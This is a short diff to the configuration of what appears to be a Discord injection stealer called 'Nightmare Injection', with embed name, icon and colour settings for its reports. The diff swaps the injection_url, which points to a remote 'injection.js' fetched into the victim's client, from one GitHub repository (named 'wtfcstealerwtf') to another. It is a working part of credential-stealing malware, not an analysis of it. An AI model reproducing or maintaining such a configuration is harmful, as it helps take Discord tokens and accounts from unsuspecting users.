@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Nightmare Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1173240257383243806/1223322785351204955/2064459-200.png?ex=66196f20&is=6606fa20&hm=672db53aa72faf7d3d64713e2b60db886ff289592974072fe0343236a0c83954&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/DemonT-T/jjs/main/injection.js', 
   /**
    
    **/
